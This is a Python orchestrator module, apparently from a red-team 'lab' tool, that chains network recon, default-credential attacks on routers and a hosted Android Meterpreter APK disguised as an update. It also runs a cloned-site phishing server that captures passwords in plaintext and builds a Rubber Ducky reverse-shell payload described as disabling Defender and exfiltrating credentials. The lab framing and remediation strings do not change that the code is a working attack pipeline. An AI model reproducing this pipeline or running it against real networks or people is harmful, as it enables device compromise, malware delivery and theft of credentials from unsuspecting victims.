"""
Attack chain scenario orchestrator for T's red team lab.
Manages the full pipeline: recon → router → pivot → RAT/phishing/Ducky → report.
"""

import asyncio
from typing import TYPE_CHECKING
from core.logger import get_logger
from .session_log import start_session, get_session
from .pivot       import full_network_scan
from .phishing    import (TEMPLATES, start_phishing_server, stop_phishing_server,
                           get_captured_creds, clear_creds, clone_site_vm,
                           inject_cred_capture)
from .rat         import gen_apk, host_apk, start_listener, list_sessions
from .report      import save_report

if TYPE_CHECKING:
    from core.ws_server import Client

log = get_logger("lab.scenario")

STEPS = [
    "recon",
    "router",
    "pivot",
    "payload",
    "phishing",
    "ducky",
    "post_exploit",
    "report",
]

_active = False
_cred_poll_task: asyncio.Task | None = None


async def start_lab(client: "Client", msg: dict) -> None:
    """Entry point — start the full lab session."""
    global _active

    subnet   = msg.get("subnet",   "192.168.1.0/24")
    lhost    = msg.get("lhost",    "")
    lport    = msg.get("lport",    "4444")
    phish_tmpl = msg.get("phish_template", "google")
    phish_url  = msg.get("phish_url", "")
    steps_sel  = msg.get("steps", STEPS)

    session = start_session(target_ip=subnet)
    _active = True

    await client.send({"type": "lab_status", "active": True,
                       "steps": steps_sel, "subnet": subnet})

    try:
        # ── Step 1: Network Recon ─────────────────────────────────────────────
        if "recon" in steps_sel:
            await _step(client, "recon", "Scanning network...")
            await full_network_scan(client, subnet)
            await _done(client, "recon", f"Network mapped — {len(session.devices)} devices found")

        # ── Step 2: Router exploit ────────────────────────────────────────────
        if "router" in steps_sel:
            router_ip = next((d["ip"] for d in session.devices if d["device_type"] == "router"), "")
            if router_ip:
                await _step(client, "router", f"Attacking router at {router_ip}...")
                await _exploit_router(client, router_ip)
            else:
                await _skip(client, "router", "No router found on network")

        # ── Step 3: Payload APK ───────────────────────────────────────────────
        if "payload" in steps_sel and lhost:
            await _step(client, "payload", "Generating Android payload...")
            await _gen_payload(client, lhost, lport)
            await _done(client, "payload", f"APK ready — host at http://{lhost}:8888/T_Update.apk")

        # ── Step 4: Phishing page ─────────────────────────────────────────────
        if "phishing" in steps_sel:
            await _step(client, "phishing", "Starting phishing server...")
            await _start_phishing(client, phish_tmpl, phish_url, lhost)
            await _done(client, "phishing", "Phishing server active on port 80")

        # ── Step 5: Ducky payload ─────────────────────────────────────────────
        if "ducky" in steps_sel:
            await _step(client, "ducky", "Generating Rubber Ducky payload...")
            await _gen_ducky(client, lhost, lport)
            await _done(client, "ducky", "DuckyScript ready — plug in your Rubber Ducky")

        # Post-exploit monitoring runs continuously until lab is stopped
        await client.send({"type": "lab_step_update", "step": "post_exploit",
                           "status": "running",
                           "message": "Monitoring for sessions and credentials..."})

        # Start credential polling loop
        global _cred_poll_task
        _cred_poll_task = asyncio.create_task(_poll_creds(client))

    except Exception as e:
        log.error(f"Lab scenario error: {e}")
        await client.send({"type": "lab_error", "error": str(e)})


async def stop_lab(client: "Client") -> None:
    """Stop the lab session and generate the report."""
    global _active, _cred_poll_task
    _active = False

    if _cred_poll_task:
        _cred_poll_task.cancel()
        _cred_poll_task = None

    stop_phishing_server()

    session = get_session()
    session.finish()

    report_path = save_report(session)
    log.info(f"Lab stopped. Report saved: {report_path}")

    # Read report HTML to send inline
    try:
        with open(report_path, "r", encoding="utf-8") as f:
            report_html = f.read()
    except Exception:
        report_html = ""

    await client.send({
        "type":        "lab_report_ready",
        "path":        report_path,
        "html":        report_html,
        "findings":    len(session.findings),
        "creds":       len(session.creds),
        "devices":     len(session.devices),
        "duration":    session.duration_str(),
    })
    await client.send({"type": "lab_status", "active": False})


# ── Internal step helpers ──────────────────────────────────────────────────────

async def _step(client: "Client", step: str, msg: str) -> None:
    await client.send({"type": "lab_step_update", "step": step,
                       "status": "running", "message": msg})


async def _done(client: "Client", step: str, msg: str) -> None:
    await client.send({"type": "lab_step_update", "step": step,
                       "status": "done", "message": msg})


async def _skip(client: "Client", step: str, msg: str) -> None:
    await client.send({"type": "lab_step_update", "step": step,
                       "status": "skipped", "message": msg})


# ── Router exploitation ────────────────────────────────────────────────────────

async def _exploit_router(client: "Client", router_ip: str) -> None:
    from devices.router import fingerprint, try_default_creds, snmp_brute
    session = get_session()
    lines   = []

    async for line in fingerprint(router_ip):
        lines.append(line)
        await client.send({"type": "lab_stream", "step": "router", "chunk": line})

    # Try default creds
    async for line in try_default_creds(router_ip):
        await client.send({"type": "lab_stream", "step": "router", "chunk": line})
        if "host found" in line.lower() or "login:" in line.lower():
            session.record("router", "default_creds", line, "critical")
            session.add_finding(
                "Router Default Credentials",
                "critical", router_ip,
                f"Router at {router_ip} accepts default credentials: {line}",
                "Change router admin password immediately from 192.168.x.1",
            )
            # Extract creds from hydra output if possible
            if "[80]" in line or "[443]" in line or "[23]" in line:
                parts = line.split("login:")
                if len(parts) > 1:
                    up = parts[1].strip().split()
                    if len(up) >= 3:
                        session.add_cred("router", up[0], up[2], f"router:{router_ip}")

    await _done(client, "router", f"Router audit complete — {len(session.findings)} findings")


# ── Payload generation ─────────────────────────────────────────────────────────

async def _gen_payload(client: "Client", lhost: str, lport: str) -> None:
    session = get_session()
    output  = []

    async for line in gen_apk(lhost, lport):
        output.append(line)
        await client.send({"type": "lab_stream", "step": "payload", "chunk": line})

    async for line in host_apk(lhost):
        await client.send({"type": "lab_stream", "step": "payload", "chunk": line})

    # Start listener in background
    asyncio.create_task(_run_listener(client, lhost, lport))

    session.record("payload", "apk_gen", f"Android meterpreter → http://{lhost}:8888/T_Update.apk", "high")
    session.add_finding(
        "Android RAT Payload Delivered",
        "critical", "android_phone",
        f"Meterpreter APK generated and hosted at http://{lhost}:8888/T_Update.apk",
        "Never install APKs from unknown sources. Disable 'Install unknown apps'.",
    )


async def _run_listener(client: "Client", lhost: str, lport: str) -> None:
    """Background Meterpreter listener — alerts when session opens."""
    async for line in start_listener(lhost, lport):
        if "Meterpreter session" in line and "opened" in line:
            get_session().record("post-exploit", "session_opened", line, "critical")
            await client.send({
                "type":    "lab_session_opened",
                "message": line,
                "lhost":   lhost,
                "lport":   lport,
            })
        await client.send({"type": "lab_stream", "step": "payload", "chunk": line})


# ── Phishing setup ─────────────────────────────────────────────────────────────

async def _start_phishing(client: "Client", template_id: str,
                           clone_url: str, lhost: str) -> None:
    session = get_session()
    redirect = clone_url or "https://google.com"

    if clone_url:
        # Clone the real site on VM, inject cred capture
        await client.send({"type": "lab_stream", "step": "phishing",
                           "chunk": f"Cloning {clone_url}..."})
        success, result = await clone_site_vm(clone_url)
        if success:
            # Read index.html from VM, inject capture script
            idx_lines: list[str] = []
            from offensive.vm_bridge import vm
            async for line in vm.run(f"cat {result}/$(ls {result}/ | head -1)/index.html 2>/dev/null || cat {result}/index.html 2>/dev/null", timeout=10):
                idx_lines.append(line)
            html = inject_cred_capture("\n".join(idx_lines), redirect)
        else:
            html = TEMPLATES.get("google", TEMPLATES["google"])["html"]
    else:
        tmpl = TEMPLATES.get(template_id, TEMPLATES["google"])
        html = tmpl["html"]

    clear_creds()
    started = start_phishing_server(html, port=80, redirect_url=redirect)

    phish_url = f"http://{lhost}/" if lhost else "http://localhost/"
    await client.send({"type": "lab_stream", "step": "phishing",
                       "chunk": f"Phishing page live at {phish_url}"})

    session.record("phishing", "server_started", f"Phishing server at {phish_url}", "high")
    session.add_finding(
        "Phishing Infrastructure Deployed",
        "high", "network",
        f"Fake login page hosted at {phish_url}. Credentials submitted here are captured in plaintext.",
        "Always verify the URL before entering credentials. Enable 2FA so stolen passwords alone are useless.",
    )


# ── Ducky payload ──────────────────────────────────────────────────────────────

async def _gen_ducky(client: "Client", lhost: str, lport: str) -> None:
    from devices.usb_hid import build_payload, save_payload, detect_ducky_drive, deploy_to_ducky
    session = get_session()

    script, desc = build_payload("reverse_shell", {"lhost": lhost, "lport": lport})
    path = save_payload(script, "inject.txt")

    await client.send({"type": "lab_stream", "step": "ducky",
                       "chunk": f"DuckyScript generated: {desc}\nSaved: {path}"})
    await client.send({"type": "lab_stream", "step": "ducky",
                       "chunk": "Payload preview:\n" + script[:400] + "..."})

    # Try to auto-deploy
    drive = detect_ducky_drive()
    if drive:
        success, msg = deploy_to_ducky(script)
        await client.send({"type": "lab_stream", "step": "ducky", "chunk": msg})
        if success:
            session.record("ducky", "deployed", f"Payload deployed to {drive}", "critical")
    else:
        await client.send({"type": "lab_stream", "step": "ducky",
                           "chunk": f"Rubber Ducky not detected. Script at {path}"})

    session.add_finding(
        "USB HID Attack Payload",
        "critical", "windows_pc",
        f"Rubber Ducky payload executes in ~8 seconds: disables Defender, drops meterpreter, installs persistence, exfiltrates credentials.",
        "Disable AutoRun. Never leave PC unlocked. Use endpoint protection that detects HID attacks.",
    )


# ── Credential polling ─────────────────────────────────────────────────────────

async def _poll_creds(client: "Client") -> None:
    """Poll captured phishing creds every 2 seconds and push to client."""
    seen: set[tuple] = set()
    while _active:
        for cred in get_captured_creds():
            key = (cred["username"], cred["password"], cred["ip"])
            if key not in seen:
                seen.add(key)
                get_session().add_cred("phishing", cred["username"], cred["password"], cred["ip"])
                await client.send({
                    "type":      "lab_cred_captured",
                    "ts":        cred["ts"],
                    "ip":        cred["ip"],
                    "username":  cred["username"],
                    "password":  cred["password"],
                    "user_agent":cred.get("user_agent", ""),
                })
        await asyncio.sleep(2)
